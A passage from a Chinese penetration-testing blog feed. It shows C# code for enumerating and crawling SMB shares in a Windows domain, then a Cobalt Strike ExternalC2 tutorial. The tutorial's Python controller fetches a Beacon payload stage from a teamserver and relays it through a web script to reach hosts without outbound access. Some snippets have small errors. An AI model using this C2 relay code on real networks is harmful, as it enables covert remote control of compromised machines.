class="title">EnumNetShares</span>(<span class="params"><span class="keyword">string</span> Server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    List&lt;SHARE_INFO_1&gt; ShareInfos = <span class="keyword">new</span> List&lt;SHARE_INFO_1&gt;();</span><br><span class="line">    <span class="keyword">int</span> entriesread = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> totalentries = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> resume_handle = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> nStructSize = Marshal.SizeOf(<span class="keyword">typeof</span>(SHARE_INFO_1));</span><br><span class="line">    IntPtr bufPtr = IntPtr.Zero;</span><br><span class="line">    StringBuilder server = <span class="keyword">new</span> StringBuilder(Server);</span><br><span class="line">    <span class="keyword">int</span> ret = NetShareEnum(server, <span class="number">1</span>, <span class="keyword">ref</span> bufPtr, MAX_PREFERRED_LENGTH, <span class="keyword">ref</span> entriesread, <span class="keyword">ref</span> totalentries, <span class="keyword">ref</span> resume_handle);</span><br><span class="line">    <span class="keyword">if</span> (ret == NERR_Success)</span><br><span class="line">    &#123;</span><br><span class="line">        IntPtr currentPtr = bufPtr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; entriesread; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            SHARE_INFO_1 shi1 = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, <span class="keyword">typeof</span>(SHARE_INFO_1));</span><br><span class="line">            ShareInfos.Add(shi1);</span><br><span class="line">            currentPtr += nStructSize;</span><br><span class="line">        &#125;</span><br><span class="line">        NetApiBufferFree(bufPtr);</span><br><span class="line">        <span class="keyword">return</span> ShareInfos.ToArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ShareInfos.Add(<span class="keyword">new</span> SHARE_INFO_1(<span class="string">"ERROR="</span> + ret.ToString(), <span class="number">10</span>, <span class="keyword">string</span>.Empty));</span><br><span class="line">        <span class="keyword">return</span> ShareInfos.ToArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>演示结果：</p><p><img src="/image/【域渗透】获取域内机器共享/blog_2019-10-16_17-29-03.png" alt=""></p><h2 id="0X02-进一步拓展"><a href="#0X02-进一步拓展" class="headerlink" title="0X02 进一步拓展"></a>0X02 进一步拓展</h2><h3 id="2-1、判断是否可读"><a href="#2-1、判断是否可读" class="headerlink" title="2.1、判断是否可读"></a>2.1、判断是否可读</h3><p>判断可读，是根据当前用户权限进行判断的。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> path = String.Format(<span class="string">"\\\\&#123;0&#125;\\&#123;1&#125;"</span>, computer, share.shi1_netname);</span><br><span class="line"><span class="keyword">var</span> files = System.IO.Directory.GetFiles(path);</span><br></pre></td></tr></table></figure><p>直接根据以上方法进行访问测试即可。效果如下</p><p><img src="/image/【域渗透】获取域内机器共享/blog_2019-10-16_17-48-07.png" alt=""></p><p>接下来就是以当前权限，对可访问的共享进行遍历即可。获取文件名、文件大小，再进行下一步的筛选。</p><h3 id="2-2、遍历"><a href="#2-2、遍历" class="headerlink" title="2.2、遍历"></a>2.2、遍历</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 对路径进行遍历</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="info"&gt;</span>提供的根路径<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ListFiles</span>(<span class="params">FileSystemInfo info</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!info.Exists) <span class="keyword">return</span>;</span><br><span class="line">  DirectoryInfo dir = info <span class="keyword">as</span> DirectoryInfo;</span><br><span class="line">  <span class="comment">//不是目录</span></span><br><span class="line">  <span class="keyword">if</span> (dir == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    FileSystemInfo[] files = dir.GetFileSystemInfos();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; files.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      FileInfo file = files[i] <span class="keyword">as</span> FileInfo;</span><br><span class="line">      <span class="comment">//是文件</span></span><br><span class="line">      <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        Console.WriteLine(file.FullName);</span><br><span class="line">      <span class="comment">//对于子目录，进行递归调用</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        ListFiles(files[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/【域渗透】获取域内机器共享/Blog_2019-10-16_22-27-27.png" alt=""></p><h2 id="0x03-现有工具"><a href="#0x03-现有工具" class="headerlink" title="0x03 现有工具"></a>0x03 现有工具</h2><ul><li>net 命令</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view \\ip # 查询指定<span class="built_in"> IP </span>共享</span><br><span class="line">net sharp # 查看<span class="built_in"> SMB </span>指向的路径[即共享]</span><br></pre></td></tr></table></figure><ul><li>Nmap</li></ul><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smb-<span class="class"><span class="keyword">enum</span>-<span class="title">shares</span>.<span class="title">nse</span> <span class="comment"># 遍历远程主机的共享目录</span></span></span><br></pre></td></tr></table></figure><ul><li>nbtscan</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan <span class="number">192.10</span><span class="number">.20</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><ul><li>powerview</li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-StealthUserHunter # 查找域中 domain admins 共享源机器(session <span class="keyword">from</span>)</span><br><span class="line">Invoke-Netview # 检索主机建立的共享会话</span><br><span class="line">Invoke-NetviewThreaded # 检索主机建立的共享会话</span><br><span class="line">Invoke-ShareFinder # 查找主机建立的共享会话</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在域内遇到瓶颈时，不妨看看域内机器开放的共享，获取有些收获。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【渗透技巧】Cobalt Strike 的 ExternalC2</title>
    <link href="https://rcoil.me/2019/10/%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91Cobalt%20Strike%20%E7%9A%84%20ExternalC2/"/>
    <id>https://rcoil.me/2019/10/【渗透技巧】Cobalt Strike 的 ExternalC2/</id>
    <published>2019-10-27T05:21:16.000Z</published>
    <updated>2019-11-01T02:35:16.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><code>Cobalt Strike</code> 的上线问题归结为以下几点：</p><table><thead><tr><th style="text-align:center">问题</th><th style="text-align:center">解决方法</th></tr></thead><tbody><tr><td style="text-align:center">目标存在杀软（被杀）</td><td style="text-align:center">Shellcode 加载器</td></tr><tr><td style="text-align:center">目标存在杀软（拦截连接）</td><td style="text-align:center">C2 处理</td></tr><tr><td style="text-align:center">目标机是 Web 映射出网</td><td style="text-align:center">特殊 C2 处理</td></tr><tr><td style="text-align:center">隔离网络</td><td style="text-align:center">出网机器做跳板</td></tr></tbody></table><p>本文针对第 3 点进行展开。</p><a id="more"></a><h2 id="0x01-前置知识点"><a href="#0x01-前置知识点" class="headerlink" title="0x01 前置知识点"></a>0x01 前置知识点</h2><h3 id="1-1、管道"><a href="#1-1、管道" class="headerlink" title="1.1、管道"></a>1.1、管道</h3><p>如果对管道不熟悉的朋友，可以将管道理解为采用消息队列方式操作的文件。为什么说管道是文件呢？因为它的本质是一段系统内核的缓冲区，可以看做是一个伪文件。在我们使用管道时，需要 Create、Open、Read、Write、Close，就和我们操作文件差不多。而又为什么说管道是采用消息队列的方式呢？因为它实际上的数据结构是一个环形队列。不同的线程都可以向里面写，也可以从里面读。写在队列末尾，读就是从队列头部删除。</p><p>管道分为两种，匿名管道（pipe）和命名管道（FIFO）。匿名管道用于父子进程通信，而命名管道可以用于任意两个进程通信。</p><ul><li><p>服务端：创建管道 &gt;&gt; 监听 &gt;&gt; 读写 &gt;&gt; 关闭</p></li><li><p>客户端：打开命令管道，获得句柄 &gt;&gt; 写入数据 &gt;&gt; 等待回复</p></li></ul><h3 id="1-2、SMB-Beacon"><a href="#1-2、SMB-Beacon" class="headerlink" title="1.2、SMB Beacon"></a>1.2、SMB Beacon</h3><p>官网的解释为：<strong>SMB Beacon 使用命名管道通过父 Beacon 进行通信，这种点对点通信借助 Beacons 在同一台主机上实现，它同样也适用于外部的互联网。Windows 当中借助在 SMB 协议中封装命名管道进行通信，因此，命名为 SMB Beacon。</strong> <code>SMB Beacon</code> 默认使用的是：<code>msagent_bb34</code></p><p>以上的说法，其实就是将 Payload 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可。</p><h2 id="0x02-ExternalC2"><a href="#0x02-ExternalC2" class="headerlink" title="0x02 ExternalC2"></a>0x02 ExternalC2</h2><p><code>ExternalC2</code> 是 <code>Cobalt Strike</code> 引入的一种规范（或者框架），黑客可以利用这个功能拓展C2通信渠道，而不局限于默认提供的 <code>HTTP(S)/DNS/SMB</code> 通道。大家可以参考<a href="https://www.cobaltstrike.com/downloads/externalc2spec.pdf" target="_blank" rel="noopener">此处</a>下载完整的规范说明。</p><p>简而言之， 用户可以使用这个框架来开发各种组件，包括如下组件：</p><ul><li><strong>第三方控制端（Controller）</strong>：负责连接 Cobalt Strike TeamServer，并且能够使用自定义的 C2 通道与目标主机上的第三方客户端（Client）通信。</li><li><strong>第三方客户端（Client）</strong>：使用自定义C2通道与第三 Controller 通信，将命令转发至 SMB Beacon。</li><li><strong>SMB Beacon</strong>：在受害者主机上执行的标准 beacon。</li></ul><p>从 <code>Cobalt Strike</code> 提供的官方文档中(文末有官方文档)，我们可以看到如下示意图：</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-09-30_10-57-10.png" alt=""></p><p>从上图可知，我们的自定义 C2 通道两端分别为<code>第三方 Controller</code> 以及<code>第三方 Client</code>，这两个角色都是我们可以研发以及控制的角色。往下走就是一个 完整的 <code>ExternalC2</code>工作流程</p><h2 id="0x03-正常的-ExternalC2-工作流程"><a href="#0x03-正常的-ExternalC2-工作流程" class="headerlink" title="0x03 正常的 ExternalC2 工作流程"></a>0x03 正常的 ExternalC2 工作流程</h2><p>一个粗糙的时序图（图中的空虚线是为了排版，无其他意义）：</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/ExternalC2.svg" alt=""></p><h3 id="3-1、ExternalC2"><a href="#3-1、ExternalC2" class="headerlink" title="3.1、ExternalC2"></a>3.1、ExternalC2</h3><p>我们需要让 <code>Cobalt Strike</code> 启动 <code>ExternalC2</code>。我们可以使用 <code>externalc2_start</code> 函数，传入端口参数即可。一旦 <code>ExternalC2</code> 服务顺利启动并正常运行，我们需要使用自定义的协议进行通信。</p><ul><li><p>启用 <code>externalc2_start</code> 函数，通知 <code>Teamserver</code> 已开启 <code>C2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">externalc2_start(<span class="string">"0.0.0.0"</span>, <span class="number">2222</span>);</span><br></pre></td></tr></table></figure></li><li><p>等待 <code>Controller</code> 连接传输配置信息</p></li><li><p>生成下发 <code>Payload Stage</code></p></li><li><p>接收和下发信息</p></li></ul><h3 id="3-2、Controller"><a href="#3-2、Controller" class="headerlink" title="3.2、Controller"></a>3.2、Controller</h3><ul><li><p>使用 <code>socket</code> 连接 <code>ExternalC2</code> 平台</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_socketToExternalC2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">_socketToExternalC3.connect((<span class="string">"193.10.20.123"</span>, <span class="number">2222</span>))</span><br></pre></td></tr></table></figure></li><li><p>规范接收与发送的数据格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFormat</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, len(data)) + data</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeFormat</span><span class="params">(data)</span>:</span></span><br><span class="line">    len = struct.unpack(<span class="string">"&lt;I"</span>, data[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">    body = data[<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">return</span> (len, body)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvFromExternalC2</span><span class="params">()</span>:</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    _len =  _socketToExternalC3.recv(<span class="number">4</span>)</span><br><span class="line">    l = struct.unpack(<span class="string">"&lt;I"</span>,_len)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> len(data) &lt; l:</span><br><span class="line">        data += _socketToExternalC3.recv(l - len(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvFromBeacon</span><span class="params">()</span>:</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    _len =  _socketToBeacon.recv(<span class="number">4</span>)</span><br><span class="line">    l = struct.unpack(<span class="string">"&lt;I"</span>,_len)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> len(data) &lt; l:</span><br><span class="line">        data += _socketToBeacon.recv(l - len(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure></li><li><p>发送配置选项（x86 or x64 、命名管道名称、间隔时间）</p></li><li><p>发送 <code>go</code>，通知 <code>ExternalC2</code> 可下发 <code>Payload Stage</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendToTS</span><span class="params">(data)</span>:</span></span><br><span class="line">    _socketToExternalC3.sendall(encodeFormat(data))</span><br><span class="line">    </span><br><span class="line">sendToTS(<span class="string">"arch=x86"</span>)</span><br><span class="line">sendToTS(“pipename=rcoil<span class="string">")</span></span><br><span class="line"><span class="string">sendToTS("</span>block=<span class="number">500</span><span class="string">")</span></span><br><span class="line"><span class="string">sendToTS("</span>go<span class="string">")</span></span><br></pre></td></tr></table></figure></li><li><p>接收来自 <code>ExternalC2</code> 所下发的 <code>Payload Stage</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> = recvFromExternalC2()</span></span><br></pre></td></tr></table></figure></li><li><p>与此同时，新开启一个 <code>Socket</code>，进行监听，等待接收来自 <code>Client (EXE)</code> 的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">_socketBeacon.bind((<span class="string">"0.0.0.0"</span>, <span class="number">8088</span>))</span><br><span class="line">_socketBeacon.listen(<span class="number">1</span>)</span><br><span class="line">_socketClient = _socketBeacon.accept()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></li><li><p>在收到 <code>Client (EXE)</code> 的连接后，向 <code>Client (EXE)</code> 发送 <code>Payload Stage</code></p></li><li><p>向<code>ExternalC2</code> 反馈来自 <code>Client (EXE)</code> 的数据</p></li><li><p>机器上线</p></li><li><p>进入数据收发循环处理流程</p></li></ul><p>可以参考<a href="https://gist.github.com/xpn/bb82f2ca4c8e9866c12c54baeb64d771" target="_blank" rel="noopener">此处</a>获取完整的 <code>Controller</code> 代码。</p><h3 id="3-3、Client-EXE"><a href="#3-3、Client-EXE" class="headerlink" title="3.3、Client (EXE)"></a>3.3、Client (EXE)</h3><ul><li><p>同样规范接收与发送的数据格式</p></li><li><p>连接 <code>Controller</code>，并接收 <code>Payload Stage</code></p></li><li>将接收到的 <code>Payload Stage</code> 使用常规的<strong>进程注入</strong>方法注入到进程中</li><li><code>SMB Beacon</code>启动并处于运行状态</li><li><code>Client (EXE)</code> 连接 <code>SMB Beacon</code> 的命名管道，用于接收或下发命令</li><li>进入数据收发循环处理流程</li></ul><p>可以参考<a href="https://gist.github.com/xpn/08cf7001780020bb60c5c773cec5f839" target="_blank" rel="noopener">此处</a>获取完整的 <code>Client (EXE)</code> 代码</p><h2 id="0x04-特殊的-C2-配置"><a href="#0x04-特殊的-C2-配置" class="headerlink" title="0x04 特殊的 C2 配置"></a>0x04 特殊的 C2 配置</h2><p>以上所配置的 C2，并不能满足我们现在的特殊需求：<strong>Web 映射出网环境上线问题</strong> 。由于目标机是不出外网的，所以无法实现上面的： <strong>Client 主动连接 Controller，进而将 Payload Stage下发</strong>，所以可以从上面的流程进行修改，其实修改起来也不难，以下是解决方案：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要在目标机器上面（根据 Web 容器）编写一个对指定的命名管道进行读取和写入的脚本(<span class="built_in">Client</span>-Web)，然后在 Controller 上对此脚本(<span class="built_in">Client</span>-Web)进行连接（读写操作），将主动变成被动即可解决。</span><br></pre></td></tr></table></figure><p>为了省略阅读时长，直接看以下时序图（图中的空虚线是为了排版，无其他意义）。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/WebExternalC2.svg" alt=""></p><p>需要多一个中转设置，我们将这个中转命名为 <code>Client-Web</code>，确保自定义周期能够完成。接下来小节中的代码，如果是应用于实战，建议自写。</p><h3 id="4-1、Controller"><a href="#4-1、Controller" class="headerlink" title="4.1、Controller"></a>4.1、Controller</h3><p>这一部分与上所述基本一致，只是将挂起的 <code>socket</code> 转为对 <code>Web</code> 的请求，主动去获取数据，再将获取到的数据进行反馈。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">// 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/controller/webc3.py</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># import random</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">PAYLOAD_MAX_SIZE = <span class="number">512</span> * <span class="number">1024</span></span><br><span class="line">BUFFER_MAX_SIZE = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcpconnect</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvdata_unpack</span><span class="params">(s)</span>:</span></span><br><span class="line">    chunk = s.recv(<span class="number">4</span>)</span><br><span class="line">    slen = struct.unpack(<span class="string">"&lt;I"</span>, chunk)[<span class="number">0</span>]</span><br><span class="line">    recvdata = s.recv(slen)</span><br><span class="line">    print(<span class="string">"recvdata_unpack: "</span> + str(slen))</span><br><span class="line">    <span class="comment"># print(recvdata)</span></span><br><span class="line">    <span class="keyword">return</span> recvdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">senddata_pack</span><span class="params">(s, data)</span>:</span></span><br><span class="line">    slen = struct.pack(<span class="string">"&lt;I"</span>, len(data))</span><br><span class="line">    s.sendall(slen+data)</span><br><span class="line">    print(<span class="string">"senddata_pack: "</span> + str(len(data)))</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">droppaylod</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="comment"># filename = random.choice(["a", "b", "c", "d"]) + str(random.randint(1000, 9999)) + ".bin"</span></span><br><span class="line">    filename = <span class="string">"payload.bin"</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"payload/"</span> + filename, <span class="string">"wb"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(data)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requestpayload</span><span class="params">(s, arch, pipename, block)</span>:</span></span><br><span class="line">    senddata_pack(s, (<span class="string">"arch="</span> + arch).encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    senddata_pack(s, (<span class="string">"pipename="</span> + pipename).encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    senddata_pack(s, (<span class="string">"block="</span> + str(block)).encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    senddata_pack(s, <span class="string">"go"</span>.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment">#为什么必须这么写，原因需要深究</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        chunk = s.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> len(chunk) &lt; <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> ()</span><br><span class="line">    slen = struct.unpack(<span class="string">'&lt;I'</span>, chunk)[<span class="number">0</span>]</span><br><span class="line">    chunk = s.recv(slen)</span><br><span class="line">    <span class="keyword">while</span> len(chunk) &lt; slen:</span><br><span class="line">        chunk = chunk + s.recv(slen - len(chunk))</span><br><span class="line">    <span class="keyword">return</span> chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_http</span><span class="params">(req, url)</span>:</span></span><br><span class="line">    <span class="comment"># res = req.get(url + "?action=read",proxies=&#123;"http": "http://127.0.0.1:8080"&#125;)</span></span><br><span class="line">    res = req.get(url + <span class="string">"?action=read"</span>)</span><br><span class="line">    print(<span class="string">"read from http: "</span> + str(len(res.content)))</span><br><span class="line">    <span class="comment"># print(res.content)</span></span><br><span class="line">    <span class="keyword">return</span> res.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_http</span><span class="params">(req, url, data)</span>:</span></span><br><span class="line">    print(<span class="string">"write to http: "</span> + str(len(data)))</span><br><span class="line">    length = struct.pack(<span class="string">"&lt;I"</span>, len(data))</span><br><span class="line">    data = length + data</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="comment"># req.post(url + "?action=write", data=data, proxies=&#123;"http": "http://127.0.0.1:8080"&#125;)</span></span><br><span class="line">    req.post(url + <span class="string">"?action=write"</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 轮询函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctrl_loop</span><span class="params">(s, req, url)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = read_http(req, url)</span><br><span class="line">        senddata_pack(s, data)</span><br><span class="line">        recvdata = recvdata_unpack(s)</span><br><span class="line">        write_http(req, url, recvdata)</span><br><span class="line">        <span class="comment">#必要的延迟，否则会出错</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># externalc2服务的IP和端口</span></span><br><span class="line">    ip = <span class="string">"193.168.113.137"</span></span><br><span class="line">    port = <span class="number">2222</span></span><br><span class="line">    soc = tcpconnect(ip, port)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 